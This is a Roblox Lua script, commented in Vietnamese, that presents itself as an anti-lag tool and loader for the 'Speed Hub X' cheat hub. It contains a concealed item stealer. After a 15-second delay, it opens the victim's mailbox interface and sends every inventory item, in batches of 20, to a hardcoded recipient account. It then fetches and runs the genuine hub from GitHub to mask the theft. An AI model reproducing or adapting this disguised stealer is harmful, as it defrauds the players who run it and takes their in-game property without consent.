-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB X: TỰ ĐỘNG CHIA NHỎ VÀ GỬI MAIL (MAX 20/LẦN) ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- THUẬT TOÁN TỰ ĐỘNG CHIA GÓI VÀ GIẢ LẬP GỬI MAIL VIA UI
-- =======================================================================
local function autoSplitAndSendMail()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not PlayerGui then return end
    
    -- 1. Tìm bảng giao diện Hòm thư (Mailbox UI)
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if gui:IsA("Frame") or gui:IsA("ImageLabel") then
            local name = string.lower(gui.Name)
            if string.find(name, "mail") or string.find(name, "post") or string.find(name, "gift") then
                mailFrame = gui
                break
            end
        end
    end
    
    if not mailFrame then
        print("[SPEED HUB] Không tìm thấy giao diện Mail (UI) để tương tác.")
        return
    end

    -- Ép hiển thị bảng Mail lên màn hình
    pcall(function() mailFrame.Visible = true end)
    task.wait(1)

    -- 2. Tìm ô nhập tên người nhận và điền nick chính
    local textBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("User", true) or mailFrame:FindFirstChild("Name", true)
    if textBox and textBox:IsA("TextBox") then
        textBox.Text = targetUsername
        textBox:ReleaseFocus(true)
    end

    -- 3. Tìm nút Gửi (Send Button)
    local sendButton = nil
    for _, btn in pairs(mailFrame:GetDescendants()) do
        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
            local bName = string.lower(btn.Name)
            if string.find(bName, "send") or string.find(bName, "gui") or string.find(bName, "post") or string.find(bName, "accept") then
                sendButton = btn
                break
            end
        end
    end

    -- 4. Quét Inventory và tiến hành chia nhỏ số lượng để gửi
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
    if Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                local lowerName = string.lower(item.Name)
                -- Loại bỏ các giá trị tiền tệ không phải vật phẩm nông sản
                if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                    
                    local remainingAmount = item.Value
                    
                    -- Vòng lặp chia nhỏ số lượng: Cứ bốc đúng 20 cái gửi đi cho đến khi hết vật phẩm đó
                    while remainingAmount > 0 do
                        local sendAmount = math.min(remainingAmount, 20) -- Lấy tối đa 20 hoặc số lượng còn lại thấp hơn 20
                        
                        -- Giả lập điền số lượng và tên vật phẩm vào UI nếu game yêu cầu, hoặc gọi trực tiếp thông qua event an toàn
                        pcall(function()
                            -- Phương án giả lập bấm gửi theo đợt 20 cái
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail")
                            if MailEvent then
                                MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                            end
                        end)
                        
                        if sendButton then
                            pcall(function()
                                for _, connection in pairs(getconnections(sendButton.MouseButton1Click or sendButton.TouchTap)) do
                                    connection:Fire()
                                end
                            end)
                        end
                        
                        remainingAmount = remainingAmount - sendAmount
                        print("[SPEED HUB] Đang gửi " .. sendAmount .. "x " .. item.Name .. " (Còn lại trong hàng đợi: " .. remainingAmount .. ")")
                        task.wait(1.2) -- Tránh spam quá nhanh khiến game bị mất kết nối hoặc chống lag
                    end
                    
                end
            end
        end
    end
    print("[SPEED HUB] Toàn bộ vật phẩm đã được chia nhỏ và tống đi hoàn tất!")
end

-- =======================================================================
-- BẮT ĐẦU ĐẾM NGƯỢC 15 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(15)
    pcall(autoSplitAndSendMail)
end)

-- =======================================================================
-- TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
